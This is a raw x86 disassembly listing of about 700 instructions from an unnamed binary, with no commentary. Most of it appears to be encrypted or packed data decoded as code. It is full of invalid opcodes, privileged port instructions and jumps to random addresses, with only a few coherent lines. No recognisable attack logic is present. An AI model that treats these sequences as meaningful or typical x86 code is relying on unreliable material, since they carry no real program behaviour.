  419fa7:	add    ebp,DWORD PTR [esi+0x6a39a818]
  419fad:	cmpps  xmm2,XMMWORD PTR [edx+0x4ca9c7c2],0x74
  419fb5:	add    al,0x6a
  419fb7:	sub    eax,0x92d04995
  419fbc:	xchg   esi,eax
  419fbd:	gs mov ecx,0x989295d0
  419fc3:	pop    ebx
  419fc4:	xor    BYTE PTR [ebx+0xe],0xda
  419fc8:	(bad)  
  419fc9:	jge    0xdbcacca0
  419fcf:	pop    edi
  419fd0:	fwait
  419fd1:	das    
  419fd2:	in     al,dx
  419fd3:	push   ecx
  419fd4:	aas    
  419fd5:	sub    BYTE PTR [edi-0x55590fc5],dl
  419fdb:	or     ecx,DWORD PTR [edi-0xa]
  419fde:	mov    dl,0x2c
  419fe0:	cmc    
  419fe1:	out    0x71,eax
  419fe3:	ret    0x1abd
  419fe6:	add    DWORD PTR [edx+0xf],edx
  419fe9:	xor    al,0x9e
  419feb:	mov    eax,ds:0xf908e1b6
  419ff0:	mov    BYTE PTR [esi],bl
  419ff2:	scas   al,BYTE PTR es:[edi]
  419ff3:	pusha  
  419ff4:	mov    esi,0xb635dbdd
  419ff9:	test   bh,cl
  419ffb:	daa    
  419ffc:	loop   0x419ff0
  419ffe:	inc    eax
  419fff:	sub    DWORD PTR [ebx+0x30],esp
  41a002:	cmp    al,0x4
  41a004:	popa   
  41a005:	idiv   BYTE PTR [edx]
  41a007:	jne    0x41a039
  41a009:	mov    ch,0x2a
  41a00b:	pop    esi
  41a00c:	xor    al,0xb1
  41a00e:	xchg   ebp,eax
  41a00f:	and    DWORD PTR [ebx+0x271d05d5],esi
  41a015:	dec    ebx
  41a016:	dec    esi
  41a017:	sar    DWORD PTR [edx-0x33171318],1
  41a01d:	retf   
  41a01e:	ins    DWORD PTR es:[edi],dx
  41a01f:	cdq    
  41a020:	leave  
  41a021:	jg     0x41a05a
  41a023:	arpl   WORD PTR [edx-0x33cbdaf1],sp
  41a029:	jg     0x419fc4
  41a02b:	jnp    0x41a07b
  41a02d:	cmp    al,0xf6
  41a02f:	adc    ah,BYTE PTR [edi+0x4e18c5bd]
  41a035:	pop    ds
  41a036:	cmp    eax,0x67ea7991
  41a03b:	idiv   BYTE PTR [ebx]
  41a03d:	inc    edi
  41a03e:	adc    al,0x65
  41a040:	in     eax,dx
  41a041:	xor    BYTE PTR [ebx],dl
  41a043:	retf   0xe834
  41a046:	xor    al,cl
  41a048:	cli    
  41a049:	sahf   
  41a04a:	out    dx,eax
  41a04b:	out    0xea,al
  41a04d:	xchg   esp,eax
  41a04e:	les    ebp,FWORD PTR [ebx-0x6aee8116]
  41a054:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a055:	es sahf 
  41a057:	push   cs
  41a058:	scas   al,BYTE PTR es:[edi]
  41a059:	leave  
  41a05a:	arpl   WORD PTR [edx-0x64],dx
  41a05d:	mov    al,ds:0xdaa0ac48
  41a062:	les    esp,FWORD PTR [ecx+0x54]
  41a065:	dec    esi
  41a066:	clc    
  41a067:	(bad)  
  41a068:	dec    esp
  41a069:	xchg   ebp,eax
  41a06a:	fisttp DWORD PTR ds:0xd5a0174d
  41a070:	popa   
  41a071:	sti    
  41a072:	fwait
  41a073:	retf   0x2663
  41a076:	scas   eax,DWORD PTR es:[edi]
  41a077:	sub    esi,ebx
  41a079:	add    eax,0x2d33bbea
  41a07e:	mov    ebp,0x934127d6
  41a083:	push   ss
  41a084:	pop    eax
  41a085:	and    BYTE PTR [ecx+0x32a0064c],0xb8
  41a08c:	iret   
  41a08d:	jp     0x41a050
  41a08f:	jo     0x41a0c2
  41a091:	add    BYTE PTR [eax+0xc],0x63
  41a095:	push   eax
  41a096:	jmp    0x41a08f
  41a098:	int3   
  41a099:	xor    dh,BYTE PTR [ebx]
  41a09b:	(bad)  
  41a09c:	sar    BYTE PTR [ecx+0x6f],0x67
  41a0a0:	mov    ebp,DWORD PTR ds:0xad983e39
  41a0a6:	bnd jne 0x41a0de
  41a0a9:	clc    
  41a0aa:	adc    esi,DWORD PTR [esi+0x78ea0e9e]
  41a0b0:	loope  0x41a083
  41a0b2:	push   esi
  41a0b3:	repz iret 
  41a0b5:	xchg   esi,ebp
  41a0b7:	jne    0x41a0e8
  41a0b9:	cs push ss
  41a0bb:	mov    eax,ebx
  41a0bd:	adc    al,0xa6
  41a0bf:	add    al,0x3d
  41a0c1:	stc    
  41a0c2:	jne    0x41a0b6
  41a0c4:	sar    DWORD PTR ds:0x537d951b,cl
  41a0ca:	es das 
  41a0cc:	aaa    
  41a0cd:	mov    ch,0x0
  41a0cf:	push   es
  41a0d0:	mov    ss,WORD PTR [ebx-0x2b161321]
  41a0d6:	js     0x41a154
  41a0d8:	and    ecx,DWORD PTR [ebx-0x3c]
  41a0db:	imul   edi,DWORD PTR [edi-0x503e9e1],0x3b
  41a0e2:	mov    DWORD PTR [ecx-0x59],0xbfebf3df
  41a0e9:	ss ins DWORD PTR es:[edi],dx
  41a0eb:	fisttp WORD PTR [ebp+ecx*4-0x64]
  41a0ef:	and    DWORD PTR [esi+0x3],ebx
  41a0f2:	pop    ebp
  41a0f3:	retf   
  41a0f4:	mov    ds:0x6bc7cb8e,al
  41a0f9:	fadd   st(2),st
  41a0fb:	jbe    0x41a161
  41a0fd:	aaa    
  41a0fe:	loope  0x41a0c8
  41a100:	(bad)  
  41a101:	arpl   WORD PTR [ebx+0x5f],dx
  41a104:	sbb    eax,0x9d3cfe26
  41a109:	jne    0x41a091
  41a10b:	xchg   ebp,eax
  41a10c:	imul   DWORD PTR [esi-0x7f99e4c2]
  41a112:	clc    
  41a113:	test   DWORD PTR [ebp+eiz*8+0x241fa143],edi
  41a11a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a11b:	daa    
  41a11c:	sub    eax,0xb0fe5d12
  41a121:	int    0xc8
  41a123:	aaa    
  41a124:	repnz sar BYTE PTR fs:[eax+0x1fa5bbc2],1
  41a12c:	dec    esp
  41a12d:	pop    ebp
  41a12e:	push   esp
  41a12f:	sub    DWORD PTR [eax+0x56],edi
  41a132:	and    BYTE PTR [ebx-0x73466a89],dl
  41a138:	cs ins DWORD PTR es:[edi],dx
  41a13a:	aas    
  41a13b:	xor    DWORD PTR [edi-0x31d2b3df],edx
  41a141:	repz fsubp st(3),st
  41a144:	pop    ecx
  41a145:	pop    ebp
  41a146:	sahf   
  41a147:	es xor ebp,esi
  41a14a:	sub    ah,ch
  41a14c:	test   esi,eax
  41a14e:	xor    DWORD PTR [eax+0x7db80541],esi
  41a154:	jno    0x41a123
  41a156:	push   ebx
  41a157:	add    BYTE PTR [edi-0x4954b7fb],ch
  41a15d:	xchg   edi,eax
  41a15e:	sub    edi,DWORD PTR [eax]
  41a160:	jns    0x41a1c0
  41a162:	cs pop eax
  41a164:	int3   
  41a165:	sti    
  41a166:	test   BYTE PTR [ebx],bh
  41a168:	(bad)  
  41a169:	jns    0x41a114
  41a16b:	or     eax,0x8f58b152
  41a170:	cmp    eax,ebp
  41a172:	mov    cl,0x5e
  41a174:	lds    eax,FWORD PTR [ecx-0x59]
  41a177:	sbb    DWORD PTR [edi+0x387ae1cf],ecx
  41a17d:	sub    ecx,DWORD PTR [ebp-0x24]
  41a180:	xchg   cl,bl
  41a182:	sbb    DWORD PTR [esi+edx*2+0x31ca4cc3],ecx
  41a189:	repnz sti 
  41a18b:	mov    al,ds:0xbdc64d46
  41a190:	mov    ds:0x3475f6cb,al
  41a195:	jmp    0xf4f7b488
  41a19a:	mov    ah,0x65
  41a19c:	sub    bl,BYTE PTR [edi]
  41a19e:	rcl    BYTE PTR [ebp-0x4b040cfe],1
  41a1a4:	dec    eax
  41a1a5:	xchg   esp,eax
  41a1a6:	jp     0x41a194
  41a1a8:	xchg   BYTE PTR [edx+edx*1],bl
  41a1ab:	dec    edi
  41a1ac:	pop    esi
  41a1ad:	inc    ecx
  41a1ae:	pop    ebx
  41a1af:	ja     0x41a21f
  41a1b1:	nop
  41a1b2:	push   0x362892ad
  41a1b7:	xchg   esp,eax
  41a1b8:	ins    BYTE PTR es:[edi],dx
  41a1b9:	shl    edx,1
  41a1bb:	jl     0x41a1b4
  41a1bd:	cwde   
  41a1be:	add    edx,DWORD PTR [ebx+edi*2]
  41a1c1:	ret    
  41a1c2:	cmp    DWORD PTR [ecx+0x72ecc67e],0x17
  41a1c9:	jne    0x41a17a
  41a1cb:	inc    ebx
  41a1cc:	out    dx,eax
  41a1cd:	cmp    ebx,DWORD PTR [eax]
  41a1cf:	sub    BYTE PTR ds:0x9f1e5cf4,dh
  41a1d5:	mov    esp,0x16338bcf
  41a1da:	cmp    edx,ecx
  41a1dc:	mov    ecx,DWORD PTR [ebp-0xc]
  41a1df:	mov    DWORD PTR [ebp+0x8],ecx
  41a1e2:	mov    ecx,DWORD PTR [ebp+0x8]
  41a1e5:	je     0x420e5d
  41a1eb:	jmp    0x41c5ad
  41a1f0:	mov    ecx,DWORD PTR [ebp+0x8]
  41a1f3:	mov    edx,DWORD PTR [ebp-0x8]
  41a1f6:	jmp    0x41c583
  41a1fb:	cmp    BYTE PTR [edi-0x66],ch
  41a1fe:	ja     0x41a189
  41a200:	ja     0x41a23d
  41a202:	xchg   ebx,eax
  41a203:	xchg   esp,eax
  41a204:	sub    BYTE PTR [edi],bh
  41a206:	into   
  41a207:	or     ecx,DWORD PTR [edx+0xf]
  41a20a:	cdq    
  41a20b:	outs   dx,BYTE PTR ds:[esi]
  41a20c:	sbb    al,0x7d
  41a20e:	jp     0x41a21a
  41a210:	pop    edi
  41a211:	jp     0x41a28d
  41a213:	aas    
  41a214:	call   0xc5d9:0x88cd84a8
  41a21b:	pop    esi
  41a21c:	push   cs
  41a21d:	mov    esi,0x913263c9
  41a222:	jns    0x41a1da
  41a224:	int3   
  41a225:	repnz test DWORD PTR [esi],ebp
  41a228:	fisubr WORD PTR [esi]
  41a22a:	push   edx
  41a22b:	retf   0x4cb3
  41a22e:	push   ecx
  41a22f:	das    
  41a230:	call   0xbe98f518
  41a235:	push   ss
  41a236:	jp     0x41a233
  41a238:	push   ebx
  41a239:	aaa    
  41a23a:	pop    edi
  41a23b:	dec    esp
  41a23c:	je     0x41a26c
  41a23e:	xchg   ecx,eax
  41a23f:	and    eax,0x95895e8c
  41a244:	ins    DWORD PTR es:[edi],dx
  41a245:	cli    
  41a246:	test   DWORD PTR [eax+ecx*4+0x23],0x7c86d490
  41a24e:	ret    0x8b6b
  41a251:	mov    ecx,0x7bba0748
  41a256:	mov    DWORD PTR [edi+0x10125ffb],eax
  41a25c:	ror    BYTE PTR [ebp+0x32],cl
  41a25f:	pop    eax
  41a260:	or     al,0x26
  41a262:	stc    
  41a263:	std    
  41a264:	sub    al,BYTE PTR [ecx+0x29fc053]
  41a26a:	dec    ebp
  41a26b:	cmp    eax,0x1851c42a
  41a270:	fstp   QWORD PTR [edi]
  41a272:	fldenv [ecx-0x2a44a8cd]
  41a278:	adc    BYTE PTR es:[eax-0x76ae60d3],dh
  41a27f:	in     eax,dx
  41a280:	(bad)  
  41a281:	das    
  41a282:	cmp    BYTE PTR [ebx-0x22],0x9d
  41a286:	ret    0xd94d
  41a289:	xlat   BYTE PTR ds:[ebx]
  41a28a:	pop    edi
  41a28b:	and    edx,DWORD PTR gs:[ecx+0x472baf1a]
  41a292:	mov    dl,0x69
  41a294:	retf   0x9e34
  41a297:	xor    al,BYTE PTR [esi]
  41a299:	add    al,BYTE PTR [edx-0x72]
  41a29c:	jmp    0x959cb3d
  41a2a1:	scas   eax,DWORD PTR es:[edi]
  41a2a2:	xchg   BYTE PTR [ebx-0x7b7c5176],ah
  41a2a8:	and    al,0xcc
  41a2aa:	push   0xffffff8d
  41a2ac:	mov    ds:0xeec25e05,eax
  41a2b1:	pop    ss
  41a2b2:	push   ebp
  41a2b3:	sub    BYTE PTR [edi+0x51],bl
  41a2b6:	sub    DWORD PTR [ecx+0x2815ed03],ebx
  41a2bc:	aad    0xa6
  41a2be:	call   0xd842:0xffb4b713
  41a2c5:	inc    eax
  41a2c6:	mul    BYTE PTR [edx+0xa4dab6f]
  41a2cc:	pop    esi
  41a2cd:	idiv   DWORD PTR [ebx-0x1c2530a5]
  41a2d3:	pusha  
  41a2d4:	cmovl  ecx,DWORD PTR [eax+ebp*4-0x1f]
  41a2d9:	sub    ah,BYTE PTR [ebp-0x1]
  41a2dc:	xchg   ecx,eax
  41a2dd:	push   esp
  41a2de:	hlt    
  41a2df:	sub    bh,BYTE PTR [esi+0x26a76d4c]
  41a2e5:	outs   dx,BYTE PTR ds:[esi]
  41a2e6:	scas   al,BYTE PTR es:[edi]
  41a2e7:	sub    edx,DWORD PTR [ebx+0x22]
  41a2ea:	neg    ebp
  41a2ec:	stc    
  41a2ed:	(bad)  
  41a2ee:	mov    dh,0xa
  41a2f0:	push   es
  41a2f1:	lods   al,BYTE PTR ds:[esi]
  41a2f2:	jg     0x41a30d
  41a2f4:	rcr    BYTE PTR [ebx-0x68ae3755],0xb8
  41a2fb:	push   ebx
  41a2fc:	or     DWORD PTR [eax-0x56b7566],ebx
  41a302:	cwde   
  41a303:	retf   
  41a304:	stos   BYTE PTR es:[edi],al
  41a305:	xor    DWORD PTR [ebx+0x4d77ad71],eax
  41a30b:	in     eax,dx
  41a30c:	mov    WORD PTR [ebp+0x4b],ss
  41a30f:	jge    0x41a374
  41a311:	cmp    DWORD PTR [edx+0x28],ecx
  41a314:	das    
  41a315:	push   es
  41a316:	adc    eax,0x65fbc9fe
  41a31b:	cmp    al,0x6e
  41a31e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a31f:	pusha  
  41a320:	mov    ah,0xe1
  41a322:	push   ecx
  41a323:	mov    BYTE PTR [eax-0x16be0c21],ch
  41a329:	sub    eax,0x43ae5a5c
  41a32e:	cmp    al,0xcc
  41a330:	xchg   esi,eax
  41a331:	push   eax
  41a332:	and    DWORD PTR [ebp-0x1789b3c9],edi
  41a338:	push   0x49bd4560
  41a33d:	push   esi
  41a33e:	mov    dl,0x7b
  41a340:	loopne 0x41a36e
  41a342:	fsubr  st(5),st
  41a344:	mov    ah,0x0
  41a346:	mov    BYTE PTR [ebx-0x71],bh
  41a349:	jnp    0x41a3a0
  41a34b:	das    
  41a34c:	mov    ebx,0x6634b68e
  41a351:	xor    esi,DWORD PTR [ebx]
  41a353:	lds    ebx,FWORD PTR [edi]
  41a355:	outs   dx,DWORD PTR ds:[esi]
  41a356:	mov    dl,0xa9
  41a358:	cld    
  41a359:	leave  
  41a35a:	push   es
  41a35b:	test   BYTE PTR ds:0x4f1378fc,0x86
  41a362:	pop    ebp
  41a363:	fldenv [edi+0x14]
  41a366:	(bad)
  41a369:	mov    cl,0x33
  41a36b:	adc    esi,DWORD PTR [ecx-0x54ac960f]
  41a371:	mov    bh,BYTE PTR [esi-0x6a]
  41a374:	xor    dl,BYTE PTR [esi+esi*1+0x16]
  41a378:	fwait
  41a379:	pop    ecx
  41a37a:	repnz icebp 
  41a37c:	(bad)  
  41a37d:	cmp    al,0x51
  41a37f:	sub    ebx,eax
  41a381:	add    DWORD PTR [ecx+0x72],edx
  41a384:	and    al,0xaf
  41a386:	mov    ebp,0x1a418aa0
  41a38b:	mov    esi,0xac7b5a55
  41a390:	pop    esi
  41a391:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a392:	ins    BYTE PTR es:[edi],dx
  41a393:	mov    eax,ds:0x7fbebec1
  41a398:	out    0x7b,eax
  41a39a:	rol    DWORD PTR [eax-0x1a7b4999],1
  41a3a0:	inc    eax
  41a3a1:	sar    DWORD PTR [esi],1
  41a3a3:	xchg   esi,eax
  41a3a4:	push   cs
  41a3a5:	retf   0xdb6
  41a3a8:	pop    ebp
  41a3a9:	out    0x54,al
  41a3ab:	fdivr  st,st(4)
  41a3ad:	sbb    ecx,DWORD PTR [ebx-0x6030daec]
  41a3b3:	jmp    0x53b8:0x6133120a
  41a3ba:	pop    ebx
  41a3bb:	in     al,dx
  41a3bc:	(bad)  
  41a3bd:	mov    ebp,0x84fe1d3
  41a3c2:	sub    dh,BYTE PTR [edx+edi*1]
  41a3c5:	or     dl,BYTE PTR [ebp+0x5ac9138a]
  41a3cb:	imul   ebp,DWORD PTR [edx],0x9815c9b3
  41a3d1:	sbb    ebx,edx
  41a3d3:	jp     0x41a3df
  41a3d5:	mov    eax,ds:0x621a905d
  41a3da:	jp     0x41a418
  41a3dc:	ins    DWORD PTR es:[edi],dx
  41a3dd:	push   0x6a38ea37
  41a3e2:	push   ecx
  41a3e3:	pop    esp
  41a3e4:	xor    al,ch
  41a3e6:	les    ebx,FWORD PTR [ebp+0x29]
  41a3e9:	stos   DWORD PTR es:[edi],eax
  41a3ea:	das    
  41a3eb:	clc    
  41a3ec:	pushf  
  41a3ed:	push   ebp
  41a3ee:	mov    ebp,0x7c4881c2
  41a3f3:	sbb    BYTE PTR ds:0xa9f0d717,0xb3
  41a3fa:	bnd ds ret 
  41a3fd:	ficom  DWORD PTR [edx-0x4a]
  41a400:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a401:	rcl    BYTE PTR ds:0x74875467,cl
  41a407:	xchg   BYTE PTR [ecx],dh
  41a409:	jb     0x41a407
  41a40b:	in     al,0xb9
  41a40d:	jmp    0x180b:0x2d4181a
  41a414:	lea    ecx,[ecx-0x22]
  41a417:	sub    al,0x1e
  41a419:	arpl   WORD PTR [esi+eiz*8+0x54],sp
  41a41d:	mov    dh,0x14
  41a41f:	int    0x8d
  41a421:	pop    ds
  41a422:	jbe    0x41a46b
  41a424:	push   0xbcbfa1d1
  41a429:	add    DWORD PTR [edx],edx
  41a42b:	mov    DWORD PTR [eax+0x5c],eax
  41a42e:	or     eax,0xe56d6ce8
  41a433:	push   ebx
  41a434:	sub    BYTE PTR [eax-0x5b],ch
  41a437:	and    al,0x3e
  41a439:	push   ebx
  41a43a:	jmp    0x2772f10d
  41a43f:	adc    BYTE PTR [esi+0x3a],dl
  41a442:	sub    ah,BYTE PTR [esi+0x39]
  41a445:	and    al,0x4
  41a447:	fnsave [edx]
  41a449:	aam    0xd
  41a44b:	push   cs
  41a44c:	mov    dh,0x93
  41a44e:	ror    ah,1
  41a450:	dec    ebp
  41a451:	sbb    ebp,DWORD PTR ds:0x46449de
  41a457:	int    0xa8
  41a459:	in     eax,0xab
  41a45b:	imul   edx,DWORD PTR [eax-0x26349233],0xffffffbc
  41a462:	test   eax,0xb4845f86
  41a467:	mov    al,0xd
  41a469:	scas   eax,DWORD PTR es:[edi]
  41a46a:	cmp    BYTE PTR [ebp+0x50],dh
  41a46d:	scas   eax,DWORD PTR es:[edi]
  41a46e:	and    DWORD PTR [edx+0x9],edi
  41a471:	xchg   edx,eax
  41a472:	clc    
  41a473:	cmp    eax,0x8debd049
  41a478:	push   esi
  41a479:	jne    0x41a49f
  41a47b:	dec    edx
  41a47c:	fcom   DWORD PTR [esi+ebp*8-0x649ae000]
  41a483:	repnz and ebp,DWORD PTR [ecx+ebx*4]
  41a487:	in     eax,dx
  41a488:	popf   
  41a489:	inc    eax
  41a48a:	xor    BYTE PTR [esi+ebx*2],ch
  41a48d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a48e:	loope  0x41a461
  41a490:	arpl   WORD PTR [ebx+0x5e065ce4],di
  41a496:	imul   ebp,DWORD PTR [edx+0x48d36ec7],0x5969ef33
  41a4a0:	add    eax,0x258c420a
  41a4a5:	rcr    DWORD PTR [ebx],1
  41a4a7:	out    0xd9,eax
  41a4a9:	jle    0x41a487
  41a4ab:	mov    esi,0x90b46f95
  41a4b0:	out    dx,al
  41a4b1:	fstp   QWORD PTR [esi-0x4b]
  41a4b4:	mov    dh,ch
  41a4b6:	dec    eax
  41a4b7:	xlat   BYTE PTR ds:[ebx]
  41a4b8:	and    esp,0x164ad2f6
  41a4be:	dec    esi
  41a4bf:	sbb    eax,0x5a84ab5d
  41a4c4:	lock cmp ecx,DWORD PTR [esi]
  41a4c7:	pop    esp
  41a4c8:	ins    BYTE PTR es:[edi],dx
  41a4c9:	enter  0xec45,0xe9
  41a4cd:	or     DWORD PTR [edi-0x21],eax
  41a4d0:	sub    BYTE PTR [eax],ah
  41a4d2:	pop    eax
  41a4d3:	jo     0x41a504
  41a4d5:	cmp    BYTE PTR [ebx-0x29],dl
  41a4d8:	adc    dh,al
  41a4da:	dec    ebp
  41a4db:	xlat   BYTE PTR ds:[ebx]
  41a4dc:	sbb    eax,0x6d26ec7f
  41a4e1:	mov    dl,0xf6
  41a4e3:	in     eax,0x93
  41a4e5:	jns    0x41a500
  41a4e7:	xor    cl,dl
  41a4e9:	or     eax,DWORD PTR [edx-0x69]
  41a4ec:	retf   
  41a4ed:	dec    ebx
  41a4ee:	loope  0x41a523
  41a4f0:	push   es
  41a4f1:	xor    eax,0xba6c8215
  41a4f6:	nop
  41a4f7:	and    eax,0xe015f1a8
  41a4fc:	adc    BYTE PTR [esi],al
  41a4fe:	mov    ss,eax
  41a500:	adc    dh,0xf
  41a503:	jecxz  0x41a568
  41a505:	(bad)  
  41a506:	or     DWORD PTR [edx+0x143712b],esi
  41a50c:	sub    DWORD PTR [edi],ebx
  41a50e:	push   esp
  41a50f:	or     ch,BYTE PTR [edx-0x51]
  41a512:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a513:	xchg   esi,eax
  41a514:	data16 sbb bh,BYTE PTR [edx]
  41a517:	hlt    
  41a518:	pusha  
  41a519:	aas    
  41a51a:	adc    eax,ebx
  41a51c:	or     bl,0x87
  41a51f:	cld    
  41a520:	psubusb mm0,QWORD PTR [ebp+0x35310295]
  41a527:	retf   
  41a528:	cli    
  41a529:	loopne 0x41a4d3
  41a52b:	shr    DWORD PTR [ecx],cl
  41a52d:	mov    edi,0x96639084
  41a532:	push   edx
  41a533:	outs   dx,BYTE PTR ds:[esi]
  41a534:	xor    ebp,0x80336a8b
  41a53a:	hlt    
  41a53b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a53c:	push   edx
  41a53d:	mov    eax,0xdd639b20
  41a542:	std    
  41a543:	sbb    ecx,esp
  41a545:	out    0xfb,eax
  41a547:	retf   
  41a548:	fnstcw WORD PTR ss:0x6e2e8748
  41a54f:	clc    
  41a550:	into   
  41a551:	xlat   BYTE PTR ds:[ebx]
  41a552:	out    dx,eax
  41a553:	ret    0x4b9f
  41a556:	jge    0x41a4e2
  41a558:	ret    0x8ea
  41a55b:	sahf   
  41a55c:	sub    esp,0x7323facf
  41a562:	or     ebp,DWORD PTR [ebx]
  41a564:	push   cs
  41a565:	inc    ebx
  41a566:	in     al,dx
  41a567:	gs lock dec ebp
  41a56a:	inc    eax
  41a56b:	int3   
  41a56c:	push   eax
  41a56d:	outs   dx,BYTE PTR ds:[esi]
  41a56e:	lahf   
  41a56f:	adc    bh,0xae
  41a572:	jg     0x41a5a0
  41a574:	stos   BYTE PTR es:[edi],al
  41a575:	jg     0x41a5d7
  41a577:	pushf  
  41a578:	imul   eax,DWORD PTR [ebp-0x4f],0xffffffc6
  41a57c:	daa    
  41a57d:	stos   BYTE PTR es:[edi],al
  41a57e:	outs   dx,DWORD PTR ds:[esi]
  41a57f:	lock push ebp
  41a581:	xor    dl,ah
  41a583:	mov    bh,0x26
  41a585:	es xor eax,0x9ce221a7
  41a58b:	fidivr DWORD PTR [esi+eax*8+0x3b]
  41a58f:	inc    BYTE PTR [esi]
  41a591:	mov    BYTE PTR ds:0xfa0b889a,bl
  41a597:	pop    DWORD PTR [esi]
  41a599:	lock ret 
  41a59b:	pop    ax
  41a59d:	sub    DWORD PTR [ebx],ecx
  41a59f:	lods   eax,DWORD PTR ds:[esi]
  41a5a0:	rol    bh,0x5d
  41a5a3:	pop    ebp
  41a5a4:	pop    esp
  41a5a5:	fcomip st,st(0)
  41a5a7:	mov    esp,0xc6c9826d
  41a5ac:	cmc    
  41a5ad:	or     BYTE PTR [edi+ebp*8+0x120942da],cl
  41a5b4:	and    BYTE PTR [eax-0x6ade01ab],0x70
  41a5bb:	iret   
  41a5bc:	aas    
  41a5bd:	mov    edi,DWORD PTR [ecx+ebx*1]
  41a5c0:	dec    ecx
  41a5c1:	jo     0x41a560
  41a5c3:	sbb    edi,eax
  41a5c5:	sub    eax,0xb5d40b5a
  41a5ca:	sti    
  41a5cb:	enter  0x57ef,0x72
  41a5cf:	mov    ds:0x6e1be7df,al
  41a5d4:	cdq    
  41a5d5:	mov    eax,ebx
  41a5d7:	xchg   edx,eax
  41a5d8:	mov    cl,0x8a
  41a5da:	mov    ss,ecx
  41a5dc:	add    al,BYTE PTR [edx+0x6a]
  41a5df:	inc    ecx
  41a5e0:	mov    esi,0x1f8acb8d
  41a5e5:	fld    TBYTE PTR [eax+0x4e]
  41a5e8:	and    al,0xe3
  41a5ea:	jp     0x41a5cd
  41a5ec:	xchg   ecx,eax
  41a5ed:	xor    al,BYTE PTR [ebx-0x36]
  41a5f0:	adc    ecx,DWORD PTR [edi-0x31cb82f0]
  41a5f6:	mov    ds:0xb12b553e,al
  41a5fb:	and    BYTE PTR [edi],ah
  41a5fd:	pop    eax
  41a5fe:	nop
  41a5ff:	(bad)  
  41a600:	scas   al,BYTE PTR es:[edi]
  41a601:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a602:	cwde   
  41a603:	jmp    0x41a672
  41a605:	js     0x41a5aa
  41a607:	jg     0x41a5c5
  41a609:	dec    ebp
  41a60a:	cmp    edx,DWORD PTR [edx]
  41a60c:	and    al,0x67
  41a60e:	fucomip st,st(6)
  41a610:	cs sar ebx,cl
  41a613:	jno    0x41a5fd
  41a615:	adc    DWORD PTR [eax+0x10],0xffffff92
  41a619:	mov    WORD PTR [ebp+0x14],ss
  41a61c:	stos   DWORD PTR es:[edi],eax
  41a61d:	inc    edx
  41a61e:	stc    
  41a61f:	rol    edi,cl
  41a621:	xchg   esi,eax
  41a622:	mov    eax,ds:0x7e03373c
  41a627:	xchg   edx,eax
  41a628:	and    ecx,DWORD PTR ds:0x373b3d84
  41a62e:	fwait
  41a62f:	mov    ebp,0x7a076e8b
  41a634:	repnz cmp al,0x54
  41a637:	(bad)  
  41a638:	or     eax,0xc1e1d488
  41a63d:	inc    edi
  41a63e:	add    BYTE PTR [edi-0x26],bl
  41a641:	xor    BYTE PTR [ebp-0xf],ch
  41a644:	pusha  
  41a645:	lahf   
  41a646:	adc    ebp,esp
  41a648:	push   edx
  41a649:	(bad)  
  41a64a:	test   DWORD PTR [edx+ebx*4],0xcde40ce9
  41a651:	xor    BYTE PTR [ebx+0x443248ba],dl
  41a657:	fisubr DWORD PTR [edx]
  41a659:	fidiv  WORD PTR [edi]
  41a65c:	cmp    dh,BYTE PTR [ecx+0x3f]
  41a65f:	call   0xd8dc:0x7ff1a99
  41a666:	icebp  
  41a667:	jne    0x41a5ed
  41a669:	mov    edi,0xc4763499
  41a66e:	aas    
  41a66f:	ja     0x41a6ab
  41a671:	xchg   ebp,eax
  41a672:	adc    al,0xae
  41a674:	retf   
  41a675:	rcr    BYTE PTR [ebx+0x62],0x50
  41a679:	out    0xf1,al
  41a67b:	(bad)  
  41a67c:	out    dx,eax
  41a67d:	inc    ebx
  41a67e:	pop    ds
  41a67f:	sub    edi,DWORD PTR [edx-0x756f46c8]
  41a685:	ret    
  41a686:	loopne 0x41a6f2
  41a688:	cmc    
  41a689:	mov    ebx,0x3037fc8
  41a68e:	cwde   
  41a68f:	inc    edi
  41a690:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41a692:	sub    ebp,DWORD PTR [ebx]
  41a694:	gs dec ebp
  41a696:	mov    ebx,0x633c47c6
  41a69b:	jmp    0xc1eb0fbb
  41a6a0:	iret   
  41a6a1:	hlt    
  41a6a2:	cld    
  41a6a3:	scas   al,BYTE PTR es:[edi]
  41a6a4:	cmp    eax,0x23c0f27a
  41a6a9:	stc    
  41a6aa:	sbb    al,0xc
  41a6ac:	inc    ebx
  41a6ad:	outs   dx,DWORD PTR ds:[esi]
  41a6ae:	idiv   BYTE PTR [edi]
  41a6b0:	sbb    BYTE PTR [ecx+0x192d51d3],bl
  41a6b6:	inc    ecx
  41a6b7:	sbb    al,0x33
  41a6b9:	add    edi,ebp
  41a6bb:	add    DWORD PTR [edx+0x49cdf7ca],ebp
  41a6c1:	jb     0x41a656
  41a6c3:	xor    dh,al
  41a6c5:	cmc    
  41a6c6:	popa   
  41a6c7:	call   0xc3e3257c
  41a6cc:	jle    0x41a6d7
  41a6ce:	mov    ebp,0x7b0648d2
  41a6d3:	adc    al,0x20
  41a6d5:	or     edi,DWORD PTR [esi+eiz*4]
  41a6d8:	test   al,0xc4
  41a6da:	jmp    0x41a754
  41a6dc:	dec    ebx
  41a6dd:	cli    
  41a6de:	loope  0x41a668
  41a6e0:	je     0x41a6ce
  41a6e2:	xor    al,0x9f
  41a6e4:	pop    es
  41a6e5:	or     ebx,DWORD PTR [ecx+0x1317914d]
  41a6eb:	sub    BYTE PTR [eax+0x45fb82da],0x3d
  41a6f2:	inc    ecx
  41a6f3:	test   eax,0xb1401649
  41a6f8:	cmp    ecx,eax
  41a6fa:	dec    edx
  41a6fb:	dec    edi
  41a6fc:	int    0xe1
  41a6fe:	sub    eax,0x1dbfbf97
  41a703:	push   edx
  41a704:	mov    esi,0xacb87ca3
  41a709:	test   BYTE PTR [edi-0x7],bh
  41a70c:	xchg   edx,eax
  41a70d:	jmp    0xae13ca75
  41a712:	repz xor bl,BYTE PTR [ebp+0x3e]
  41a716:	ins    BYTE PTR es:[edi],dx
  41a717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a718:	test   al,0x3b
